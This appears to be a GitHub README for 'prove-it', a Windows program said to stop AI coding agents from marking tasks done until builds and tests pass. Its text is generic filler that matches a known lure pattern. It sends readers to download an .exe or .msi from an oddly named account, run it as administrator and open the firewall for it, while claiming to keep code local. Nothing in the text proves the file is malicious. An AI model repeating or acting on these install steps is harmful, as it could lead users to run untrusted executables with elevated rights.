# 🔍 prove-it - Verify your code agent tasks automatically

[![](https://img.shields.io/badge/Download_prove-it-blue.svg)](https://github.com/clangorous-rastafarian429/prove-it)

Coding agents often claim their work is complete before they finish the task. prove-it watches your agent during the coding process. It forces the agent to run tests, perform builds, and check the code after every change. This tool ensures the code actually works before the agent marks the job as done. You get peace of mind knowing the agent provided honest evidence for every line of code it wrote.

## ⚙️ System Requirements

Your computer needs a few basic items to run prove-it:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 500 megabytes of free space on your hard drive.
* Basic knowledge of how to run programs on your computer.

## 💾 How to Install and Start

Follow these steps to set up prove-it on your Windows machine:

1. Visit this page to download the latest version: [https://github.com/clangorous-rastafarian429/prove-it](https://github.com/clangorous-rastafarian429/prove-it).
2. Look for the file ending in .msi or .exe under the latest release section.
3. Save the file to your computer.
4. Double-click the file to start the installer.
5. Follow the instructions on the screen to finish the setup.
6. Once finished, open your Start menu and search for "prove-it" to launch the program.

## 🛠️ How it Works

Many people use AI tools to write code. These tools write files but rarely check if the files work. prove-it sits between your agent and your code. It works like a guard. When the agent submits code, prove-it blocks the submission. It triggers an automatic build process. If the build fails, the agent must fix the error. Next, it runs your existing test suite. If a test fails, the agent receives a report and must try again. Finally, it records the output as evidence. The agent cannot say it is done until all checks pass.

## 🚀 Setting up Your Agent

You can connect prove-it to the tools you already use. Open the settings menu inside the application. You will see a list of compatible agents. Select the agent you use for your coding tasks. The application creates a bridge between your agent and the test environment. You do not need to write extra scripts. prove-it handles the background tasks for you.

## 📋 Common Tasks

### Checking New Code
When you ask your agent to create a new feature, prove-it monitors the progress. It watches the terminal output from your agent. If the agent finishes a file, prove-it starts the verification immediately. You see a green checkmark on your screen when the evidence is ready.

### Reviewing Evidence
Historical logs exist for every session. Click the history tab to see past tasks. You can view the build logs and test results for any session. This gives you a clear record of how your agent performed. Use these logs to see where your agent struggles or where it performs well.

### Updating the Application
The app checks for updates every time you open it. If a new version exists, a window appears on your screen. Click update to install the latest improvements. This ensures you have the newest features and compatibility patches.

## ❓ Troubleshooting

Most users find the setup process simple. If you run into issues, check these frequent problems:

* **The app does not launch:** Ensure you have the latest drivers for your computer. Restart your machine and try again.
* **The agent fails verification:** Read the logs in the report window. The logs tell you if a test failed or if a build error occurred. Pass these logs back to the agent to help it correct its work.
* **Permission errors:** Run the application as an administrator if it cannot access your project folders. Right-click the icon and choose Run as Administrator.
* **Network issues:** If the app cannot connect to your agent, check your firewall settings. Ensure that the application has permission to reach the internet.

## 🛡️ Privacy and Data

Your code stays on your machine. prove-it verifies your code locally. It does not send your source code to external servers. The evidence logs remain stored on your computer disk. You keep full control over your files. 

## 🌐 Community and Support

Feel free to open an issue on the GitHub page if you find a bug. Provide a clear description of what happened when you tried to use the app. Attach a screenshot if possible. This helps provide a quick solution to your problem. We maintain this tool for users who want better quality assurance for their AI coding projects.

Keywords: agent-skills, ai-agents, claude-code, codex, coding-agents, cursor, developer-tools, github-copilot, llm, quality-assurance, testing, verification